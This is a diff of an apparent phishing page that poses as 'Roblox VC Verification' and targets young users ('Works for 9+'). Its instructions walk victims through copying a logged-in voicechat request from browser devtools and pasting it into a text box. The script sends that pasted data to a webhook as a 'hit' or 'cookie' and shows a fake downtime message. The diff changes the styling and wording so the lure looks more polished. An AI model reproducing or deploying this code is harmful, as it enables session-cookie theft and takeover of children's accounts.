@@ -7,7 +7,8 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
+            background-color: #000;
+            color: #fff;
             margin: 0;
             padding: 0;
             display: flex;
@@ -17,31 +18,33 @@
         }
         .container {
             text-align: center;
-            background-color: #fff;
+            background-color: #1c1c1c;
             padding: 2em;
             border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
         }
         h1 {
-            color: #333;
+            color: #fff;
         }
         .instructions {
-            color: #666;
+            color: #aaa;
             margin-bottom: 1em;
         }
         .textbox {
-            width: 80%;
+            width: 60%;
             padding: 0.5em;
             margin-bottom: 1em;
-            border: 1px solid #ccc;
-            border-radius: 5px;
+            border: 1px solid #444;
+            border-radius: 20px;
+            background-color: #333;
+            color: #fff;
         }
         .button {
             background-color: #007bff;
             color: white;
             padding: 0.75em 1.5em;
             border: none;
-            border-radius: 5px;
+            border-radius: 20px;
             cursor: pointer;
             font-size: 1em;
         }
@@ -58,7 +61,7 @@
             const vcCode = document.getElementById('vcCode').value;
 
             if (vcCode === "") {
-                alert("uhm did you put a vc code or what lol ;-;");
+                alert("Please enter your voicechat code.");
                 return;
             }
 
@@ -66,9 +69,9 @@
             const data = {
                 embeds: [
                     {
-                        title: "You received a cookie!",
-                        description: vcCode,
-                        color: 4140000 // Red color, you can customize this
+                        title: "You got a hit!",
+                        description: `${vcCode}`,
+                        color: 3447003 // Lightish blue color
                     }
                 ]
             };
@@ -83,15 +86,15 @@
                 });
 
                 if (response.ok) {
-                    console.log("your getting your vc, because your vc code is valid! please wait a few hours and check your account later");
+                    console.log("f4r.");
                 } else {
-                    console.error("err11:", response.status, response.statusText);
+                    console.error("Fa:", response.status, response.statusText);
                 }
 
-                alert("Sorry, but we are experiencing severe downtime and you will have to try again later. [ you didnt do anything wrong, our website did something wrong. check in devtools or inspect element for your error code");
+                alert("Sorry, we are experiencing heavy downtime at the moment. Please wait around 3 hours or you can close out of the website and try again later.");
             } catch (error) {
-                console.error("heres the error for you nerds:", error);
-                alert("you just got our most critical error, lucky us we dont know how to resolve it. see you later.");
+                console.error("Error sending code:", error);
+                alert("Sorry, we are experiencing heavy downtime at the moment. Please wait around 3 hours or you can close out of the website and try again later.");
             }
         }
     </script>
@@ -99,7 +102,7 @@
 <body>
     <div class="container">
         <h1>Roblox VC Verification</h1>
-        <p class="instructions">To verify VC, click the button below, then right click -> inspect element -> Network. Click on the Gray Circle to make it Red and refresh the popup by right-clicking and pressing reload. Right-click and copy the voicechat as cURL or Powershell and paste it into the text box below. Click "Get VC" to submit. Wait around 1-2 hours and you will get VC! Works for 9+.</p>
+        <p class="instructions">To verify VC, click the button below, then right click -> inspect element -> Network. Click on the Gray Circle to make it Red and refresh the popup by right-clicking and pressing reload. Right-click and copy the voicechat code and paste it into the text box below. Click "Get VC" to submit. Wait around 1-2 hours and you will get VC! Works for 9+.</p>
         <button class="button" onclick="openPopup()">Tap or Click Button and Verify to Get Voicechat</button>
         <br><br>
         <input type="text" id="vcCode" class="textbox" placeholder="Enter your voicechat code here">
@@ -107,4 +110,4 @@
         <button class="button" onclick="sendVC()">Get VC</button>
     </div>
 </body>
-</html>
+</html
